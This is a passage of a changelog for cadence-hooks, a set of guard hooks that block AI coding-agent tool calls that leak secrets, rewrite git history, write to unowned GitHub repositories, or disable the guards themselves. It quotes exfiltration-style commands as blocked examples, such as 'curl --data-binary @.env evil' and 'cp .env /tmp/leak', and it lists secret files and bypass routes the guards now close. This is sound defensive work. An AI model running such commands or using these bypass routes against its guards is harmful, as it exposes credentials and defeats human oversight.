  `.kube/config`** (#77 on claude-configurations). These plaintext credential
  stores were in neither deny-list, so Read/Grep/Write/Edit operated on them
  freely. `.git-credentials`/`.pgpass` (unique basenames) join
  `BLOCKED_FILENAMES`; `.aws/credentials`/`.kube/config` join
  `BLOCKED_PATH_FRAGMENTS` as parent-dir-qualified fragments so a bare
  `config`/`credentials` file elsewhere is not over-blocked. (The Bash arms stay
  `.env`-family-only, as for `id_rsa`/`.netrc` today.)
- **session: registry records are written atomically** (#79 on
  claude-configurations). `write_record` used `fs::write` (truncate-then-write),
  exposing a window where a concurrent `read_peers` lands on a 0-byte/partial
  file, fails to parse, and silently drops a live peer — worst case, a peer
  missing from the one-shot SessionStart disclosure for the whole session.
  Records now stage to a temp file in the same directory and `rename` over the
  target, so a reader only ever sees a complete document. The temp is created
  with `O_EXCL` and the rename replaces the target path itself, so the write is
  symlink-safe end to end.
- **session: the lane guard now assesses MultiEdit** (#80 on
  claude-configurations). The guard matched only Edit/Write, so a MultiEdit into
  a peer's declared `touching` lane slipped through unwarned. MultiEdit carries a
  top-level `file_path`, so matching the arm is sufficient (the hook matcher
  already routes MultiEdit to the binary).
- **obsidian trash_guard: quoted vault paths no longer evade the check** (#82 on
  claude-configurations). When cwd was outside the vault, the in-vault scan used
  raw `split_whitespace`, so a quoted absolute vault path evaded it — a leading
  `"` defeated the absolute-path test, and a quoted path with spaces (e.g.
  `Field Reports/…`) was shredded across tokens. The scan now uses the
  quote-aware `core::shell::tokenize`, so `rm "/vault/Field Reports/old.md"` is
  caught; out-of-vault quoted paths stay allowed.
- **content guards: terminology, orphaned-todos, and line-endings now inspect
  MultiEdit** (#83 on claude-configurations). All three gated on
  `input.content()`, which is `None` for a MultiEdit payload (it carries
  `edits[]`), so every MultiEdit hit the early allow() unchecked. A new
  `HookInput::edit_fragments()` exposes the introduced/removed fragment pairs —
  one per `edits[]` element — that the guards fold over; terminology preserves
  its introduced-vs-existing diff (#63) per edit. Write/single-Edit behavior is
  unchanged.
- **git-safety: block history-rewrite and remote-mirror destruction** (#84 on
  claude-configurations). `git filter-branch`/`filter-repo` (mass history
  rewrite), `git update-ref` deleting or repointing a protected branch, and
  `git push --mirror` (overwrites/deletes all remote refs) fell through to
  Allow. Now blocked; a non-protected `update-ref -d` nudges.
- **guard-gh-write: cover release upload, secret/variable set, label clone**
  (#87 on claude-configurations). These write GitHub state and accept `-R`, but
  the noun/verb table missed them, so ownership was never checked. Added via a
  separate anchored pattern so `clone` can't make `gh repo clone` (a local read)
  look like a write. (`gh ruleset` is read-only — written via `gh api`, already
  covered; account-level `ssh-key`/`gpg-key` and `--owner` `project` excluded.)
- **dispatch: protect security guards from silent `CADENCE_DISABLE`** (#89 on
  claude-configurations). Disabling a guard by name exited 0 with no trace, and
  nothing exempted the enforcement guards — `CADENCE_DISABLE=git-safety` silently
  neutered it. Now every disable emits a one-line stderr notice, and a protected
  set (secret/git/gh/vault/browser/trash guards) refuses to disable and still
  runs. Use the loud, per-session `CADENCE_BYPASS` for maintenance.
- **session: `find_own` verifies the full `session_id`, not the 8-char suffix**
  (#90 on claude-configurations). `find_own` resolved a session's own record by
  the `.<short-id>.json` filename suffix and returned the first `read_dir` match
  without ever parsing it, so two sessions whose ids share the first 8 chars
  (notably manual `--session-id` values) cross-resolved — `read_own`/`touch_own`
  and the drift baseline could read or overwrite the *other* session's record. A
  new `matches_own` parses the candidate and checks the full `session_id`;
  `find_own` returns only a verified match (and `None` when more than one
  verifies — ambiguous). `sweep_stale` inlined the same suffix-only
  self-exclusion (the twin site), so a stale peer sharing the prefix was wrongly
  spared from the sweep; it now verifies the full id too.
- **terminology: anchor the source-exemption to path components** (#91 on
  claude-configurations). The `cadence-hooks/`/`.claude/hooks|rules`/`claude.md`
  exemptions were unanchored substrings, so a sibling `legacy-cadence-hooks/`, a
  spoofed `x.claude/hooks/`, or `evilclaude.md` got a free pass. Now matched on
  `/`-split components.
- **memory-guard: measure the resulting file and anchor to the auto-memory
  root** (#92, #93 on claude-configurations). The 200-line cap counted the Edit
  *fragment* (`content()`), so an Edit appending to a near-limit MEMORY.md was
  allowed while the file grew past the cap — now uses `effective_content()`. The
  `/memory/` path test over-matched any project file with a `memory/` dir — now
  anchored to `<config>/projects/<slug>/memory/` with `.`/`..`/`\` normalized
  before matching, so a nested `docs/memory/` or a `..`-traversal path neither
  over-matches an ordinary file nor smuggles MEMORY.md past the cap.
- **prevent-secret-leaks: sharpen the echo-secret nudge** (#85 on
  claude-configurations, partial). The exfil nudge matched uppercase `KEY`/
  `SECRET`/… against the original-case command, so `echo $database_password`
  (lowercase) was missed; keywords are now lowercased on both sides, and
  `echo`/`printf` match at command position (not substring) so a benign arg or
  path containing those words no longer over-fires. (The secret-value content
  scanner — the rest of #85 — ships separately.)
- **metrics: atomic subagent log writes, current model prices, tail-bounded
  transcript scan** (#94, #95, #96 on claude-configurations). `log-subagent`
  built its JSONL line with `writeln!` (many small writes that tear under
  concurrent appends) — now one `write_all`, matching the sibling loggers.
  `prices.json` gained `claude-opus-4-8` and `claude-fable-5` (commit cost was
  silently `$0` for the current default models), plus an `unpricedModels` record
  field so an unknown model is loud rather than a silent zero. `scan-tokens`
  parsed the entire transcript on every commit; it now byte-scans past the
  marker and only JSON-parses the tail, bounding the per-commit hot-path cost.

## [0.30.0] - 2026-06-16

### Fixed

- **cadence secret guards: block the `.env.<x>` family on Read/Grep/Write/Edit**
  (#64 on claude-configurations). The `.env` family was classified two ways: the
  Bash path used a component substring-minus-safe-suffix predicate over
  `.env.<x>`, while the Read/Grep/Write/Edit tool path used exact membership
  against `BLOCKED_FILENAMES` — which omitted `.env.prod`, `.env.dev`,
  `.env.development.local`, `.env.docker`, and the rest. So `Read .env.prod` was
  allowed while `cat .env.prod` was blocked — the most-used ingestion tools were
  the weakest check. The family logic is now a single shared
  `is_env_family_secret` helper called from both predicates, so the tool and
  shell paths agree on one rule.
- **guardrails: validate an explicit `git push <URL>` against ownership**
  (#68 on claude-configurations). `extract_remote` rejected any non-remote token,
  so an explicit push URL (HTTPS or SCP) was discarded and the guard resolved and
  validated `origin` in its place — allowing an irrecoverable push to an
  arbitrary unowned host whenever `origin` happened to be owned. The new
  `extract_push_target` classifies the positional target as `Named`, `Url`, or
  `None` (tracking fallback); a `Url` is validated directly via `check_owner`,
  blocking unowned hosts and naming the actual URL in the block message, while
  `Named`/`None` keep the existing resolve-through-git behavior. URL detection
  reuses `host_and_repo_from_url` (the same parser `check_owner` uses) and covers
  the user-less SCP form (`host:owner/repo.git`).
- **session: the stale-sweep no longer prunes live peers, and drift baselines on
  a declared branch** (#69, #70 on claude-configurations). `run_start` now
  reads/builds/writes its own record (refreshing mtime) *before* calling
  `sweep_stale`, eliminating the self-sweep-then-minimal-rebuild path that
  stripped a quiet session's intent/touching on `/clear` or compaction;
  `sweep_stale` also excludes the caller's own file, and the staleness threshold
  rises 10 → 30 minutes so a long read/think phase stays out of reach. The
  commit-time drift warning now baselines against a new `declared_branch` field
  that moves only when *this* session runs its own checkout/switch (detected via
  the heredoc-aware `is_branch_switch`), so a peer moving shared HEAD no longer
  masks divergence. Old records parse with `declared_branch=None` via serde
  defaults (fail-open) and self-heal on the next session start — no migration.

## [0.29.0] - 2026-06-10

### Fixed

- **core::shell: model heredoc bodies, command substitutions, and visible
  assignments** (#116 on claude-configurations). `split_segments` now strips
  heredoc bodies before splitting, so a heredoc line like `see the .env file`
  no longer becomes a fake `see` command with a `.env` operand — a real
  prevent-secret-leaks false-block on 0.28.0. `command_segments` additionally
  surfaces command substitutions (`$(…)`, backticks) in executed context, so
  `echo $(cat .env)`, `curl -d "$(cat .env)" …`, and `echo \`cat .env\`` are
  judged as the reads they are; and resolves visible `VAR=value` assignments,
  so `OP_CMD=op; $OP_CMD item list` is seen as `op item list`. Single-quoted
  and escaped forms stay literal; an environment-sourced variable stays
  unresolved (fail open). A body is dropped only when its terminator is found
  (an exotic delimiter or a `<<` inside double quotes keeps the lines, so a
  command bash executes is never silently dropped). Every guard inherits these
  through `command_segments`.
- **git-safety: consume remaining separate-arg global flags; nudge
  `checkout --` named-pathspec discards** (#117 on claude-configurations).
  Git's remaining enumerable global flags that take a separate argument —
  `--namespace`, `--super-prefix`, `--config-env`, `--attr-source` — now
  consume their argument, so `git --namespace ns push --force origin main` no
  longer hides the subcommand and escapes (only a truly unknown future
  separate-arg flag remains a documented gap). `git checkout [-<ref>] --
  <named paths>` now nudges — the same overwrite-local-edits operation as
  `git restore <named path>` — since everything after `--` is unambiguously a
  pathspec; discard-all forms (`.`, `./`, `:/`) keep blocking, and bare
  `git checkout <name>` without `--` stays out of scope.
- **secret guards: `find -exec`/`-delete` no longer escapes the metadata-safe
  exemption** (#118 on claude-configurations). `find` is metadata-safe on its
  own, but `find . -name .env -exec cat {} \;` printed contents and `find .
  -name .env -delete` / `-exec rm {} \;` destroyed the file — both allowed on
  0.28.0. prevent-secret-leaks now judges the exec-family subcommand (`-exec`,
  `-execdir`, `-ok`, `-okdir`): a non-metadata-safe action with a dangerous
  `.env`-family token among find's args blocks, while `-exec ls …` and a plain
  `find -name .env` stay allowed. prevent-secret-writes blocks `find` carrying
  `-delete` or an exec-family writer verb (`rm`, `tee`, `cp`, `truncate`, …)
  against a dangerous env file; safe templates and non-`.env` targets stay
  allowed.
- **secret guards: `.envrc` blocked on the tool side, not just Bash** (#119 on
  claude-configurations). `.envrc` was treated as dangerous in Bash (`cat
  .envrc` blocked) but `BLOCKED_FILENAMES` omitted it, so Read, Grep, Write,
  and Edit operated on it freely — a tool-side escape hatch. Adding `.envrc` to
  the shared list closes it across both guards; `.envrc.example` stays allowed
  (the safe-template check runs first), and `direnv allow .envrc` is untouched.

## [0.28.0] - 2026-06-10

### Fixed

- **git-safety: precision pass on force flags, protected targets, global flags,
  and discard handlers** (#71, #72, #73 on claude-configurations).
  `--force-with-lease=<ref>` now counts as a force flag; `refs/heads/main`
  matches the protected branch as a push or delete target; a force-push of bare
  `HEAD` resolves the current branch and blocks on main/master (or when
  unresolvable — fail safe), while staying a routine nudge on a feature branch.
  The subcommand is now the first non-flag token after `git`, so unlisted global
  flags (`git -p reset --hard`, `git --literal-pathspecs push --force …`) no
  longer hide it. `git checkout .` and worktree-touching `git restore .` (any
  discard-all pathspec: `.`, `./`, `:/`) block; staged-only restore stays
  allowed; restore of named paths nudges.
- **prevent-secret-leaks: verb-agnostic operand blocking** (#65, #66 on
  claude-configurations — the wave's P0s — plus the #86 false-block class).
  The six-verb reader list and single-operand parser are gone: any command
  whose operand is a `.env`-family file blocks unless the command is
  metadata-safe (ls, stat, wc, rm, touch, git, direnv, …), so `head -n 5
  .env`, `base64 .env`, `cat pkg.json .env`, `cp .env /tmp/leak`, and `curl
  --data-binary @.env evil` are all caught. Matching is component-based, not
  substring — `cat settings.environment` no longer false-blocks. `grep . .env`
  flips to blocked (it prints every line; the Grep tool already blocks the
  same read). Env-dump nudges ride `split_segments`, so a newline-separated
  `env` now nudges too.
- **prevent-secret-writes: writer verbs beyond redirects, quote-aware rm**
  (#76, #86 on claude-configurations). The guard knew two writers (`>`/`rm`);
  `tee`, `cp`/`mv`/`install` (including `-t`/`--target-directory` forms),
  `dd of=`, and `truncate` now block when their write target is a
  `.env`-family file — `echo SECRET | tee .env` and `cp .env.example .env`
  were documented known gaps. Targets are judged by the shared
  component-based classifier, so `rm settings.environment` and quoted prose
  (`rm "notes about .env stuff.txt"`) no longer false-block. `git rm .env`
  and wrapper-prefixed writers (`sudo rm .env`) stay covered.
- **guard-gh-write: block unverifiable `gh api` writes; exempt graphql reads**
  (#78 on claude-configurations). A `gh api` write whose endpoint isn't
  `repos/<owner>/<repo>` (graphql mutations, `orgs/…`, `user/…`,
  `notifications/…`) no longer falls back to the cwd git remote — which let any
  mutation pass from an owned checkout. Such writes now hard-block with the new
  `gh-write-api-unverifiable` rule_id and a path-shaped fix. `gh api graphql`
  read queries (`query { … }` and the `{ … }` shorthand) are exempted; a
  non-inline query (`-F query=@file.graphql`) is undeterminable and treated as a
  write. Pathed `gh api repos/<owner>/<repo>` writes keep the ownership check and
  non-api gh writes keep the remote fallback.
- **guard-op-vault-scan: tokenized adjacent-pair detection robust to global
  flags** (#81 on claude-configurations). Detection no longer enumerates command
  shapes with a regex — each shell segment is tokenized, and a scan is any `op`
  invocation (basename of the command word) with an `item`/`vault` token
  immediately followed by `list` after the command word. 1Password global flags
  between `op` and the subcommand (`op --format json item list`,
  `op --account x item list`, `op --cache item list`, `op --session abc item
  list`) no longer evade the guard, and quoted-prose protection plus shell-wrapper
  expansion (`bash -c '…'`) are now structural via `command_segments`.
- **guard-gh-dangerous: catch the API-form repo delete** (#88 on
  claude-configurations). `gh api -X DELETE repos/<owner>/<repo>` is an
  irreversible repo deletion that the subcommand-form regex (`gh repo delete`)
  never saw. A tokenized pass now blocks it across every Cobra method spelling
  (`-X delete`, `--method delete`, `-X=DELETE`, `--method=DELETE`, `-XDELETE`),
  in chains and `sh -c` wrappers, but only at exact owner/repo depth — sub-resource
  deletes (`repos/o/r/issues/1`, `repos/o/r/git/refs/heads/x`) stay allowed.

## [0.27.0] - 2026-06-10

### Added

- `core::shell::split_segments` / `command_segments` — quote-aware splitting of a
  shell command into its top-level segments (`&&`, `||`, `;`, `|`, `&`, newline),
  with recursive `sh -c '…'` wrapper expansion. The shared primitive guards use
  to judge every command a shell will run, not just the first.

### Fixed

- **git-safety: compound-command and quote-aware bypasses** (#61, #62, #63).
  git-safety now judges every command in a chain — `git status && git push
  --force origin main` no longer slips because the first command is benign — and
  sees through `sh -c '…'` wrappers, matches path-form git (`/usr/bin/git`),
  reads quoted flags (`"--force"`), and exempts an alias definition only for its
  own segment instead of the whole command line.
- **guard-gh-write: chained writes resolved per-segment** (#67). A gh write chain
  is now judged one command at a time — `gh pr comment -R me/owned … && gh repo
  delete evil/unowned --yes` no longer slips because the benign first `-R`
  resolved the whole chain. Each write segment resolves its own target (and a
  write hidden in `sh -c '…'` is seen); the first unowned/unresolvable write
  blocks. Loop handling and structured block payloads are unchanged.
- **prevent-secret-writes: every redirect in a chain is inspected** (#75). The
  guard scanned only the first `>`/`>>`, so `echo ok > safe.txt && echo SECRET >
  .env` slipped. It now scans each command segment for all redirect operators —
  `>`, `>>`, `>|`, and stderr/fd forms (`2>`) — quote-aware (a `>` inside a
  string is literal), plus `rm` targets, and sees writes hidden in `sh -c '…'`.
  `split_segments` also no longer mis-splits the `>|` clobber operator as a pipe.

## [0.25.0] - 2026-06-08

### Added

- `guard-browser-device` (guardrails, PreToolUse) blocks the **first**
  Claude-in-Chrome MCP tool call of a session (`mcp__claude-in-chrome__*`),
  exiting 2 with a re-clarify message that routes through
  `list_connected_browsers` → `AskUserQuestion` → `select_browser`. It writes a
  per-session marker and allows every subsequent call — a one-shot handshake so
  an unconfirmed action can't land on the wrong physical Chrome when several are
  paired to one account. **Deliberate policy exception** to `developing-guards`'
  block-vs-nudge heuristic: a single connected browser would route to a nudge,
  but a nudge is exit 0 and the tool still runs, so its context would arrive
  *after* the action already hit a device. Stopping *before* the irreversible
  side effect requires exit 2. The guard fires at most once per session, fails
  open on any error (ADR-0001), and does not verify a device was actually chosen
  — it trusts the model to act on the message, then opens the gate. (Companion
  `mcp__claude-in-chrome__.*` matcher ships in `cadence-guardrails`'s `hooks.json`.)
- `warn-overshare` (cadence): nudges Claude to audit about-to-ship content (commit messages, PR/issue bodies, changed files) for personal-context overshare — disabilities, neurodivergence, health, relationships, family, non-technical biographical detail. Fires on `git push`, `git commit`, `gh pr create`, `gh pr edit`, `gh issue create`, `gh issue comment`, and Write/Edit to `docs/field-reports/` paths. Skips writes under `$OBSIDIAN_VAULT` (the safe destination for personal context) and to `docs/blog/*retro*` paths (retros feed blog articles and are intentionally personal). Session-scoped bypass: `CADENCE_SKIP_OVERSHARE_AUDIT=1`. (Companion `hooks.json` wiring ships in `cadence-guardrails`.)
- New `guardrails inject-gh-context` check (SessionStart): renders the configured gh-write allowlist (`CADENCE_ALLOWED_OWNERS`, `CADENCE_ALLOWED_REPOS`, `CADENCE_EXTRA_HOSTS`) and the `gh ... -R owner/repo` rule into Claude's context at session start, resume, and post-compaction. Companion wiring ships in `cadence-canon`'s `hooks.json`. Primes the model with the same context `guard-gh-write` enforces, recovering "silent damage" cases where `cwd`'s remote happens to be allowlisted but is not the intended write target.

## [0.24.0] - 2026-06-08

### Added

- New `CheckResult::block_structured(message, BlockMetadata)` builder + `BlockMetadata` struct (`rule_id`, `fix`, `allowed_owners`, `severity`) in `cadence_hooks_core`. When a check returns a structured block on a PreToolUse event, `run_check` now emits a `permissionDecision: "deny"` JSON envelope on stdout (carrying both `permissionDecisionReason` for the prose and `additionalContext` for the structured payload) alongside the legacy stderr+exit-2 message — Claude self-corrects from the machine-parseable shape instead of re-parsing prose. The legacy `CheckResult::block(...)` path is unchanged; checks opt in by calling `block_structured`.
- `guardrails guard-gh-write` upgraded three of its hard-block sites to the new primitive:
  - `gh-write-unauthorized-target` — `fix` substitutes the first allowed owner under the same project name (e.g. `evil-corp/cool` → `-R cameronsjo/cool`).
  - `gh-write-target-unresolvable` — `fix` is `-R <first-allowed-owner>/<repo>` when no repo can be inferred.
  - `gh-write-loop-missing-repo` — `fix` is the resolved repo when a deterministic loop's cwd resolves to an owned repo, or `-R <owner>/<repo>` otherwise.

  The unconfigured fail-safe and fork-not-allowed paths intentionally stay on the legacy `block` for now and will follow in a separate PR.

## [0.23.0] - 2026-06-06

### Added

- Hard blocks now carry a feedback-channel footer — `If this fired in error: /cadence:feedback` — appended to the stderr message of any `Outcome::Block`. It turns a false-positive block into one structured issue on the meta-repo (`cameronsjo/claude-configurations`) via the new `cadence:feedback` skill, instead of silent friction. Nudges and loop-blocks are untouched (they aren't errors). Suppress with `CADENCE_NO_FEEDBACK_FOOTER` set to any non-empty value.

## [0.21.0] - 2026-06-05

### Added

- Native Windows support for the binary. CI now runs check/clippy/test on `windows-latest`, and the release pipeline builds an `x86_64-pc-windows-msvc` leg, shipping `cadence-hooks.exe` in a `.zip` (with checksum + provenance) alongside the existing unix `.tar.gz` artifacts. The Homebrew tap dispatch is unchanged.

### Changed

- Replaced ten POSIX-only assumptions with portable code so the binary is correct outside WSL/unix: a `cadence_hooks_core::paths::user_home()` helper (`HOME` → `USERPROFILE` → `HOMEDRIVE`+`HOMEPATH`) and `marker_temp_dir()` (`std::env::temp_dir`) replace `HOME`-or-`/tmp` reads and hardcoded `/tmp` markers; a single jiff-backed `cadence_hooks_core::time` module replaces four `date -u` shell-outs (and gives `warn-cron-datetime` portable local time + timezone + weekday); and `obsidian-trash-guard` normalizes both the vault root and hook paths before comparison. Adds `jiff` as the one new dependency.

## [0.20.0] - 2026-06-04

### Changed

- `guard-git-init` now also fires on `gh repo create` (not just `git init`), and its nudge frames the license as the author's decision — routing to `/cadence-groundwork:choosing-license` to compare options before assuming one. The guard name is unchanged. (Companion `if`-filter broadening ships in `cadence-guardrails`'s `hooks.json`.)

## [0.19.0] - 2026-06-04

### Changed

- `validate-skill-frontmatter` now accepts an optional `namespace:` prefix on a skill's `name:` field — the `plugin:directory` invocation id (e.g. `name: cadence:attune`, `name: cadence-forge:add-narrative-logging`). Bare names still pass; the post-colon suffix must still equal the skill directory, so `cadence:wrong` for an `attune/` dir is still blocked. The namespace itself is not verified against the plugin name: deriving the plugin from the file path is fragile (source vs cache) and the check must not force the prefix on non-cadence users. This reverses the prefix-rejection tightened in #65 — the cadence ecosystem standardizes on the prefix for discoverability and self-documenting source.

## [0.18.0] - 2026-06-04

### Changed

- Global state paths (metrics, persona ledger, the `doctor` plugin scan) now honor `CLAUDE_CONFIG_DIR`, matching Claude Code's own config-dir relocation, instead of hardcoding `~/.claude`. A new `cadence_hooks_core::paths` module resolves the config dir (first non-empty comma entry, `~`-expanded; falls back to `~/.claude`); `doctor`'s plugin scan falls back to `~/.claude/plugins` when the config-dir variant is absent, staying correct whichever directory the plugin loader uses.

## [0.15.1] - 2026-06-02

### Changed

- `guard-pr-issue-link` renamed to `warn-pr-issue-link` and downgraded from a hard block to a nudge. PRs without a linked issue are a routine, intentional workflow; the check now reminds about closing keywords instead of blocking `gh pr create`. The companion `verify-pr-autoclose` (PostToolUse, advisory) is unchanged and still covers broken issue refs.

## [0.13.0] - 2026-06-01

### Added

- Five guardrails checks converting machine-enforceable prose rules from a personal CLAUDE.md into deterministic hooks (#52, #53):
  - `guard-op-vault-scan` (**block**) — `op item list` / `op vault list` enumeration, including inside exec wrappers. Single-item reads (`op read`, `op item get`) stay allowed; the guard targets enumeration, not access.
  - `warn-curl-alias` (nudge) — bare `curl` with `-H`/`--header` flags, for machines where curl is aliased to curlie (which infers POST from JSON-like headers, causing silent 400s). Per-segment analysis keeps `grep -H` and other piped tools from false-positiving.
  - `warn-gh-merge-preflight` (nudge) — pre-flight checklist on `gh pr merge`: draft PRs report MERGEABLE/CLEAN but fail with a GraphQL error (check `isDraft`); worktree checkouts break `--delete-branch` local cleanup; failed merges may have landed server-side (verify `mergedAt` before retrying).
  - `warn-coderabbit-retrigger` (nudge) — `@coderabbitai review` comments are no-ops on already-reviewed content (CodeRabbit's incremental review is content-cached, not SHA-cached); push a new commit instead.
  - `warn-alias-parsing` (nudge) — piping aliased-tool output (`cat`/`find`/`ls`/`du`/`df`/`top` → bat/fd/eza/dust/duf/btm) into parsers. Fires only when the aliased tool is a pipeline *producer*; consumer position (`git diff | cat`) and interactive use stay silent.
- `KNOWN_DISTINCT_SETTINGS_SCRIPTS` allowlist in the registration audit test, for settings.json scripts that trip the keyword-overlap heuristic without duplicating any plugin hook (first entry: `block-vault-git-writes.sh`, an Obsidian-vault guard unrelated to the 1Password `guard-op-vault-scan`).

## [0.12.0] - 2026-06-01

Backfilled entry — this release shipped without a changelog section.

### Added

- Three guardrails checks: `guard-dotfiles` (block direct edits to production dotfiles, opt-in via `CADENCE_GUARD_DOTFILES=1`), `guard-pr-issue-link` (block `gh pr create` without a closing issue keyword), `verify-pr-autoclose` (verify and repair issue auto-close after PR create/merge). (#43, #47)
- `doctor` subcommand cross-reference + registry export + `--quiet`. (#39, #48)

### Fixed

- Mid-line security-pattern line numbers + audit enforcement for the cadence-rules migration. (#49)

### Removed

- Homebrew beta channel retired; stable formula is the single release channel. (#39, #50)

## [0.11.0] - 2026-05-30

### Added

- `lab` namespace for the [cadence-lab](https://github.com/cameronsjo/cadence-lab) plugin: a two-hook **self-representation persona ledger**. `persona-nudge` (SessionStart, startup/clear) injects a constrained contract asking the model to record a per-session self-representation (form/qualities/stance/color/texture/confidence) to a staging file; `persona-gate` (PostToolUse/Write) runs Tier 1 schema validation with itemized feedback plus a Tier 2 regex cheek heuristic (warn mode → system-written `flags`), then promotes the validated record into an append-only `~/.claude/persona/personas.jsonl`. The ledger only receives hook-written, validated records. Configurable via `~/.claude/persona/config.json`; retry cap downgrades to a `forced-accept` flag. New crate `crates/lab/`. (#41)
- Core: `HookEvent::SessionStart`, and `Outcome::LoopBlock` + `CheckResult::loop_block` — the documented exit-0 `{"decision":"block","reason":...}` re-prompt primitive for PostToolUse feedback loops (a hard `exit 2` can't un-run a tool that already executed). `HookInput` gains `session_id`/`source`/`model` fields + accessors (`Default` derived); new `make_session` test builder. All backward compatible — existing Pre/Post hooks are unaffected.

## [0.10.0] - 2026-05-23

### Added

- `metrics` namespace: fire-and-forget loggers for the [cadence-metrics](https://github.com/cameronsjo/cadence-metrics) plugin, ported from its bash hooks. `snapshot` (PreToolUse) records HEAD before a `git commit`; `log-commit` (PostToolUse) scans the transcript for token usage since the last commit, computes USD cost from an embedded-but-overridable price table (`--prices` / `CADENCE_METRICS_PRICES`), and appends to `commits.jsonl`; `log-subagent` (SubagentStart/Stop) appends lifecycle records to `subagents.jsonl` (`CADENCE_METRICS_DEBUG=1` adds a `_keys` field). New `Logger` trait + `run_logger_from_stdin` in core keep logging (always exit 0) separate from the enforcement `Check` trait. JSONL output verified at parity with the bash hooks.
- `nudge-polish-before-pr` hook (cadence plugin) fires on `gh pr create` and reminds the model to run `/polish` (cadence-forge:polish) — a branch-scoped polish pass against `origin/main` — before opening the PR. Gated by `if: "Bash(gh pr create*)"` so the binary only spawns on actual PR-create commands. Skippable for trivial fixes or branches already polished. Disable via `CADENCE_DISABLE=nudge-polish-before-pr`.
- `CADENCE_ALLOW_MAIN` env var permanently silences `warn-main-branch` for a repo. Set in `<repo>/.claude/settings.json` (project) or `~/.claude/settings.json` (user-global) under the `env` block. Truthy values: `1`, `true`, `yes` (case-insensitive). Useful for repos where main IS the working branch by design — personal scratchpads, dotfiles, vaults.
- `cadence-hooks doctor` subcommand scans installed plugin `hooks.json` files for shell-expansion bugs (initially: single-quoted `${CLAUDE_PLUGIN_ROOT}` and bare env vars). Reports one block per offender; exits 1 when violations exist. `--root <dir>` overrides the default `~/.claude/plugins/cache` scan path. (#24)
- `Check::skip_at_effort()` trait method lets individual checks opt out at specific `$CLAUDE_EFFORT` levels without each implementer reading the env var by hand. Default `&[]` preserves current behavior — opt in for heavy diagnostics that are optional on trivial sessions. (#23)

### Changed

- `warn-main-branch` message now suggests `--for 2h` (was `30m`) and surfaces both silencing options: time-bounded snooze and permanent `CADENCE_ALLOW_MAIN` env var.

### Fixed

- `warn-main-branch` now scopes branch detection to the edited file's repo via `git -C`, resolves relative file paths against `HookInput.cwd`, and passes the resolved `repo_root` to the snooze lookup. Previously the hook resolved git context from the hook process's CWD, so editing inside a nested repo from a session whose CWD was the outer parent both fired wrong warnings and broke per-repo snooze suppression. (#26)
- `prevent-secret-leaks` env-dump heuristic now position-checks chain segments with a quote-aware splitter instead of substring-matching. Eliminates false positives on benign commands containing `env` as a substring — branch names ending in `-env`, commit messages mentioning env vars, `gh env list`, `aws-vault env`, `direnv env`, `grep env_dump`, and heredocs inside `"$(...)"` no longer fire the nudge. (#22, #25)

## [0.8.0] - 2026-04-21

### Changed (breaking)

- Renamed all configuration env vars under a unified `CADENCE_*` prefix:
  - `CADENCE_HOOKS_DISABLE` → `CADENCE_DISABLE`
  - `CADENCE_HOOKS_BYPASS` → `CADENCE_BYPASS`
  - `GIT_GUARDRAILS_ALLOWED_OWNERS` → `CADENCE_ALLOWED_OWNERS`
  - `GIT_GUARDRAILS_ALLOWED_REPOS` → `CADENCE_ALLOWED_REPOS`
- `OBSIDIAN_VAULT` stays unprefixed (cross-tool convention).

### Added

- Under Claude Code (detected via `CLAUDECODE=1`), the `configure` subcommand is hidden from `--help` and refuses to run interactively. `configure --list` stays available. This closes a bypass route where an agent could silently disable guardrails by launching the interactive wizard.

### Migration

Update `.claude/settings.json` or any shell rc where you set the old vars:

```diff
- "CADENCE_HOOKS_DISABLE": "guard-push-remote"
+ "CADENCE_DISABLE": "guard-push-remote"
- "GIT_GUARDRAILS_ALLOWED_OWNERS": "cameronsjo cameron"
+ "CADENCE_ALLOWED_OWNERS": "cameronsjo cameron"
```

## [0.4.1] - 2026-03-16

### Added

- AST-based chain analysis for `git push` — chained pushes to the same remote (e.g. `git push origin main && git push origin v1.0`) are now allowed instead of blanket-blocked
- 15 adversarial tests for chain analysis bypass attempts

### Fixed

- Cross-platform `bump-version.sh` — works on both macOS and Linux

## [0.4.0] - 2026-03-16

### Added

- AST-based loop analysis via `brush-parser` — loops with explicit targets pointing to owned repos are now permitted instead of blanket-blocked
- `warn-cron-datetime` guardrail for CronCreate hooks
- Unit tests for `warn-main-branch` (10 tests) and `check-idle-return` (11 tests)
- Adversarial input tests and edge case hardening across all hooks
- Panic handler for graceful failure reporting

### Changed

- Extracted shared shell utilities (`strip_quotes`, `repo_from_url`, `git_command`, `parse_work_dir`) into `cadence-hooks-core::shell`
- `guard-gh-write` now resolves `cd` chains via `parse_work_dir`
- Reordered `guard-push-remote` checks so structural blocks precede env var checks
- Narrowed version-mismatch catch-all to specific clap error kinds
- 551 tests (up from 486)

### Fixed

- Normalized file paths to prevent bypass attacks
- Reduced false positives from CodeRabbit review findings
- Fail open with warning on plugin version mismatch

## [0.3.0] - 2026-03-12

### Added

- Initial implementation: 19 hooks across 4 plugin crates
- Core protocol library (`cadence-hooks-core`) with `Check` trait, JSON parsing, exit codes
- **cadence** hooks: terminology, orphaned-todos, prevent-secret-leaks, prevent-secret-writes, memory-guard, git-safety, line-endings, env-vars, warn-untracked, markdown-lint
- **guardrails** hooks: guard-push-remote, guard-gh-write, guard-gh-dangerous, guard-git-init, warn-main-branch, check-idle-return
- **rules** hooks: validate-frontmatter, security-patterns
- **obsidian** hooks: trash-guard
- CI workflow with fmt, clippy, and test checks
- Release workflow with cross-compilation (linux x86_64/aarch64, macOS x86_64/aarch64)
- SLSA build provenance attestation on releases
- 486 tests covering happy paths, edge cases, and bypass scenarios
